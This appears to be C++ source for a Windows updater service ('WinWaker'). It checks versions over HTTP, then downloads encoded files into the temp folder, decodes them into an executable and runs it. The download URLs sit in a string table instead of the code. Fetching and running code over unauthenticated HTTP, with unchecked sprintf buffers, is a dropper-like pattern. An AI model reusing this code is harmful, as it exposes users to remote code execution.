#include <Windows.h>
#include "WorkLog.h"
#include "http.h"
#include "run.h"
#include "codec.h"
#include "file.h"
#include "libstr.h"
#include "version.h"

extern BOOL bRunning;
extern HANDLE ghSvcStopEvent;
extern HANDLE ghThread;
BOOL bWinWakerVersionExpired = FALSE;
BOOL bWinWakerUpdateVersionExpired = FALSE;

DWORD WINAPI ThreadFunction( LPVOID lpParam );
VOID CheckVersion();
VOID StartWinWakerUpdate();
VOID UpgradeWinWakerUpdate();

VOID WinWakerTask()
{
	if (ghSvcStopEvent == NULL)
	{
		WorkLog::Format("event is null, ignored\n");
		return;
	}

	// start working thread
	DWORD dwThreadId;
	ghThread = CreateThread(
            NULL,                   // default security attributes
            0,                      // use default stack size  
			ThreadFunction,       // thread function name
            NULL,                   // argument to thread function 
            0,                      // use default creation flags 
            &dwThreadId             // returns the thread identifier
			);
	if (ghThread != NULL)
	{
		WorkLog::Format("create thread ok, thread id %d\n", dwThreadId);
	}
	else
	{
		// "create thread fails\n"
		WorkLog::Format("create thread fails\n");
	}
}

DWORD WINAPI ThreadFunction(LPVOID lpParam)
{
	WorkLog::Format("thread start\n");

	// Sleep to wait network available
	int i = 0;
	while (bRunning && i < 6)
	{
		// Check whether to stop the service.
		DWORD rc = WaitForSingleObject(ghSvcStopEvent, 1000);
		if (rc == WAIT_TIMEOUT)
		{
			WorkLog::Format("check %d\n", i);
		}
		else if (rc == WAIT_OBJECT_0)
		{
			WorkLog::Format("check WAIT_OBJECT_0 %d\n", i);
			break;
		}
		else
		{
			WorkLog::Format("check break %d\n", i);
			break;
		}
		i++;
	}

	CheckVersion();
	if (bWinWakerVersionExpired)
	{
		StartWinWakerUpdate();
	}

	if (bWinWakerUpdateVersionExpired)
	{
		UpgradeWinWakerUpdate();
	}

	WorkLog::Format("thread stop\n");
	return 0;
}

VOID CheckVersion()
{
	// Check version
	do
	{
		// "http://www.winwaker.org/download/winwaker.version.txt?v=0"
		std::string url = GetStrById(101);
		char buffer[256] = { 0 };
		BOOL rc = HTTPGet(url.c_str(), buffer, sizeof buffer);
		if (!rc)
		{
			break;
		}

		// read version
		int version = 0;
		int i = sscanf(buffer, "%d", &version);
		if (i == 1)
		{
			WorkLog::Format("self version found %d\n", version);
			if (WINWAKER_VERSION < version)
			{
				bWinWakerVersionExpired = TRUE;
			}
		}
	} while (false);

	// Check version
	do
	{
		// "http://www.winwaker.org/download/winwakerupdate.version.txt?v=0"
		std::string url = GetStrById(102);
		char buffer[256] = { 0 };
		BOOL rc = HTTPGet(url.c_str(), buffer, sizeof buffer);
		if (!rc)
		{
			break;
		}

		// read version
		int version = 0;
		int i = sscanf(buffer, "%d", &version);
		if (i == 1)
		{
			WorkLog::Format("update version found %d\n", version);
			if (WINWAKERUPDATE_VERSION < version)
			{
				bWinWakerUpdateVersionExpired = TRUE;
			}
		}
	} while (false);
}

VOID StartWinWakerUpdate()
{
	std::string szProtectionCode;
	// "WinWakerUpdate"
	std::string szExeFilePath = "WinWakerUpdate.exe";
	GetProtectionCode(szProtectionCode, GetStrById(120));
	// Start process
	ExecProcess(szExeFilePath.c_str(), szProtectionCode.c_str());
}

VOID UpgradeWinWakerUpdate()
{
	// "WinWakerUpdate"
	char szExeFilePath[256] = { 0 };
	sprintf(szExeFilePath, "%s/%s.exe", userTempPath.c_str(), GetStrById(120));
	if (!IsFileExists(szExeFilePath))
	{
		// "WinWakerUpdate"
		char szTxtFilePath[256] = { 0 };
		sprintf(szTxtFilePath, "%s/%s.%s.txt", userTempPath.c_str(), GetStrById(120), timeString.c_str());

		// Download
		// "http://www.winwaker.org/download/winwakerupdate.cab?v=0"
		std::string url = GetStrById(103);
		BOOL rc = HTTPDownloadFileFromUrls(szTxtFilePath, url.c_str(), url.c_str());
		if (rc)
		{
			// decode
			rc = Decode(szTxtFilePath, szExeFilePath);
			DeleteFile(szTxtFilePath);
			WorkLog::Format("download update ok\n");
		}
		else
		{
			WorkLog::Format("download update error, url=%s\n", url.c_str());
			return;
		}
	}

	// "WinWakerUpdate"
	char szConfigFilePath[256] = { 0 };
	sprintf(szConfigFilePath, "%s/%s.cfg", userTempPath.c_str(), GetStrById(120));
	// if (!IsFileExists(szConfigFilePath))
	DeleteFile(szConfigFilePath);
	if (true)
	{
		// "WinWakerUpdate"
		char szTxtFilePath[256] = { 0 };
		sprintf(szTxtFilePath, "%s/%s.%s.txt", userTempPath.c_str(), GetStrById(120), timeString.c_str());

		// Download
		// "http://www.winwaker.org/download/winwakerupdate.cfg.cab?v=0"
		std::string url = GetStrById(104);
		BOOL rc = HTTPDownloadFileFromUrls(szTxtFilePath, url.c_str(), url.c_str());
		if (rc)
		{
			// decode
			rc = Decode(szTxtFilePath, szConfigFilePath);
			DeleteFile(szTxtFilePath);
			WorkLog::Format("download update cfg ok\n");
		}
		else
		{
			WorkLog::Format("download update cfg error, url=%s\n", url.c_str());
			return;
		}
	}

	if (IsFileExists(szExeFilePath) && IsFileExists(szConfigFilePath))
	{
		char args[256] = { 0 };
		sprintf(args, GetStrById(121), userTempPath.c_str(), szConfigFilePath);
		BOOL rc = ExecProcess(szExeFilePath, args);
		if (rc)
		{
			WorkLog::Format("execute update ok\n");
		}
		else
		{
			WorkLog::Format("execute update error, path=%s, args=%s\n", szExeFilePath, args);
			return;
		}
	}
}